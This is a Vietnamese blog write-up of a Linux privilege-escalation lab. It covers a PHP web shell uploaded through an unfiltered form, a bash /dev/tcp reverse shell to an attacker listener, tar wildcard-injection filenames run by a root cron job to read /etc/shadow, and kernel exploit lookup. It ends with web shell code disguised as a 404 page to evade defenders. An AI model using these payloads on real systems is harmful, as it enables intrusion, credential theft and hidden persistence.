---
layout: post
title: "Privileges Escalation Linux"
tags: PrivilegesLinux redteam
categories: jekyll update
---

# Privileges Linux

Ban đầu, mình được cung cấp 1 máy ảo credential là **`cbjs:cbjs`** → cho nên mình cần vào đó để có thể lấy ip. 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image.png)

Tại đây ip của mình **`192.168.116.143`** , trong challenge này đã được set sẵn port **`80`** . Nếu muốn vẫn có thể scan nhưng mình truy cập cho nhanh nha :D

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%201.png)

Thì giao diện như trên nên mình click vào thoai !! 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%202.png)

Ở đây, mình có 1 chức năng upload. Thì mình hoàn toàn có thể làm blackbox, nhưng mà mình làm whitebox cho nó dễ nên click **`Debug Source`** 

Mình quan trọng mình xử lý backend. 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%203.png)

Thì thấy ở đây khá đơn giản → nó nối đường dẫn file sẽ **`uploads` + `ten_file`**.

### 📁 Upload File Shell

---

Nhưng mà ở đây ko có filter dì hết nên sẽ upload 1 file shell. 

Và nếu mình đang tấn công thiệt, thì ko nên đặt tên con shell là shell hay tên dễ nhận biết nhóe :”>>> 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%204.png)

Mình thử truy cập **`uploads/healthcheck.php`** 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%205.png)

Như vậy từ đây thấy nó hoàn toàn xử lý file **`php`** mình vừa upload.

Và để thao tác thì mình cần 1 tham số có thể **`GET`** hoặc **`POST`** , nhưng nếu là **`GET`** thì hoàn toàn để lại log từ đó blueteam hoàn toàn có thể nhận biết. 

- Truyền tham số **`GET`**
    
    Mình gói payload như hình sau:
    
    ![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%206.png)
    
    Mình vẫn thử truy cập như bình thường 
    
    ![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%207.png)
    
    Và mình tiến hành xem log trên server tại **`/var/log/apache2/access.log`** 
    
    ![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%208.png)
    

Cho nên mình chọn giải pháp truyền tham số **`REQUEST` → sẽ bao gồm cả `GET` và `POST`** 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%209.png)

Tiếp tục như trên mình truy cập như trên

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2010.png)

Và trên log nó ko để lại nhiều dấu vết như **`GET`** 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2011.png)

Và nếu để như này thì hoàn bất tiện trong việc thao tác thông qua tham số. 

Cho nên mình thử cắm 1 reverse shell trên target → nghĩa là trên host attack mở port lắng nghe và host target gửi yêu cầu mún kết nối. 

Thì khi mở reverse shell thông qua 2 con shell:

- **`/bin/sh`**
- **`/bin/bash`** (bản đời sau của **`/bin/sh`**)

Trên host attack mình dùng **`netcat`** để thực hiện lắng nghe 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2012.png)

Trên shell đã upload mình chạy payload như sau: 

> **`bash -c “bash -i >& /dev/tcp/<ip>/1524 0>&1”`**
> 

Quay lại, thì mình hoàn toàn đã có kết nối. 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2013.png)

Nhưng đây thì mình mới là quyền ghẻ :”> của 1 user bình thường **`www-data`** 

Mục tiêu là mình cần leo lên quyền **`root`** 

### 🧗 Leo quyền bằng **`crontab`**

---

Mình cần kiểm tra **`sudo -l`** 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2014.png)

Nhìn thấy thì có **`/usr/bin/find`** - chạy bằng **`root`** mà ko cần password :”>> 

Mình cần tìm hiểu tool này chắc năng là gì :”> 

```vbnet
**/usr/bin/find --help
Usage: /usr/bin/find [-H] [-L] [-P] [-Olevel] [-D help|tree|search|stat|rates|opt|exec] [path...] [expression]

default path is the current directory; default expression is -print
expression may consist of: operators, options, tests, and actions:

operators (decreasing precedence; -and is implicit where no others are given):
      ( EXPR )   ! EXPR   -not EXPR   EXPR1 -a EXPR2   EXPR1 -and EXPR2
      EXPR1 -o EXPR2   EXPR1 -or EXPR2   EXPR1 , EXPR2

positional options (always true): -daystart -follow -regextype

normal options (always true, specified before other expressions):
      -depth --help -maxdepth LEVELS -mindepth LEVELS -mount -noleaf
      --version -xdev -ignore_readdir_race -noignore_readdir_race

tests (N can be +N or -N or N): -amin N -anewer FILE -atime N -cmin N
      -cnewer FILE -ctime N -empty -false -fstype TYPE -gid N -group NAME
      -ilname PATTERN -iname PATTERN -inum N -iwholename PATTERN -iregex PATTERN
      -links N -lname PATTERN -mmin N -mtime N -name PATTERN -newer FILE
      -nouser -nogroup -path PATTERN -perm [+-]MODE -regex PATTERN
      -readable -writable -executable
      -wholename PATTERN -size N[bcwkMG] -true -type [bcdpflsD] -uid N
      -used N -user NAME -xtype [bcdpfls]

actions: -delete -print0 -printf FORMAT -fprintf FILE FORMAT -print
      -fprint0 FILE -fprint FILE -ls -fls FILE -prune -quit
      -exec COMMAND ; -exec COMMAND {} + -ok COMMAND ;
      -execdir COMMAND ; -execdir COMMAND {} + -okdir COMMAND ;

Report (and track progress on fixing) bugs via the findutils bug-reporting
page at http://savannah.gnu.org/ or, if you have no web access, by sending
email to <bug-findutils@gnu.org>.**
```

Thì tool này dùng tìm kiếm file đồ này nọ :”> thì từ tool này sao leo quyền nhỉ 

Giờ trước mắt mình cứ dùng tool này tìm ra những file nào mà thuộc nhóm root :”> coi sao 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2015.png)

Thì ko dì có thể xài được nhỉ :”> nên cứ để tạm đó. 

Và 1 trong những cách leo quyền còn biết đến là dùng **schedule tasks.** 

Trong linux → **`/etc/crontab`** để theo dõi các task được lên lịch.

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2016.png)

Quan sát dòng đầu tiên → thì cứ sau mỗi phút thì account **`root`** vào trong folder **`/var/www/html/uploads`** rồi zip lại tất cả các file trong folder **`uploads`** 

Như vậy thì mình cần xác định tool **`tar`** này có còn hoạt động trên server hay ko??

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2017.png)

Thì mình thấy nó có **`--checkpoint-action=ACTION`** vậy **`ACTION`** này gì?

Thì theo chatgpt như sau:

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2018.png)

Vậy thì mình thử chạy lệnh sau: 

> **`tar -zcf /dev/null /dev/null --checkpoint-action=echo=123 --checkpoint=1`**
> 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2019.png)

Như vậy nó in ra được **`123`** → thử ACTION exec 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2020.png)

Như vậy hoàn toàn được lun :D 

Quay lại nội dung **`/etc/crontab`** 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2021.png)

Thì mình thắc mắc là tại sao có **`*`** ?? 

Thì sau khi tìm hiểu thì nó là wildcard. Thử ví dụ như sau: 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2022.png)

Vậy nếu mình tạo thử 1 file hay 1 folder có tên là các argument đặc biệt này thì nó có bị hiểu lầm hay ko :v  

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2023.png)

Thì hoàn toàn **`ls`** đã bị đánh lừa. 

Như vậy mình thử áp dụng nó cho **`tar`** 

Mình sẽ tạo 2 file có tên là **`--checkpoint-action=exec=sh exploit.sh`** và **`--checkpoint=1`** vào folder **`/var/www/html/uploads`** 

Tạo thêm file **`exploit.sh`** có nội dung để đọc thêm file **`/etc/shadow`** 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2024.png)

Thì nó bao gồm lun các shell trước mình đã up nên hơi rối tí!! 

Sau đó, mình ngồi chờ tí cho **`crontab`** hoạt động.

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2025.png)

Như vậy mình đã đọc được hoàn toàn. 

Mình tiếp tục lặp lại để có thể đọc flag tại **`/root`** 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2026.png)

### 🧗 Leo quyền bằng kernel

---

Tactic của leo quyền bằng kernel thường như sau: 

- thu thập thông tin về kernel (tool hoặc bằng tay)
- tìm các CVE hoặc public exploit về kernel version
- Thực thi khai thác trên kernel này

1️⃣ **Xác định version kernel**

Sau khi, gắm shell thì hoàn toàn có xác định version kernel bằng **`uname -a`** hoặc **`/proc/version`**

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2027.png)

Hoặc mình có thể dùng tool như:

- https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- https://github.com/The-Z-Labs/linux-exploit-suggester

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2028.png)

Như vậy mình xác định version là **`3.13.0`** 

2️⃣ **Dùng `searchsploit` để tìm kiếm**

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2029.png)

3️⃣ **Thực hiện leo quyền** 

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2030.png)

Sau đó mình upload file này và chạy.

![image.png](/assets/images/redteam/PrivilegesEscalationLinux/image%2031.png)

## 🛃 Custom cho shell tránh bị phát hiện

---

Trong môi trường thực tế thì mình càng phải hành động một cách kín đáo tránh bị phát hiện bởi blue team. 

Thay vì mình chỉ code đơn giản là **`<?php system($_REQUEST['x']); ?>`** thì tại sao mình không giả dạng nó thành 1 trang 404 để tránh bị để ý. 

Và cần lưu ý là mình nên giả đến status code nó càng tốt. 

```php
**<?php 
header("HTTP/1.0 404 Not Found");
?>

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
    <head>
        <title>404 Not Found</title>
    </head>
    
    <body>
        <h1>Not Found</h1>
        <p>The requested URL /healthcheck.php was not found on this server.</p>
        <hr>
        <address>Apache/2.4.7 (Ubuntu) Server at 192.168.116.143 Port 80</address>
    </body>
</html>

<?php 
    $cmd = $_REQUEST['cmd'];

    if (!empty($cmd) && md5($_REQUEST['password']) == '...') 
    {
        var_dump($cmd);
        var_dump(system($cmd));
    }
?>**
```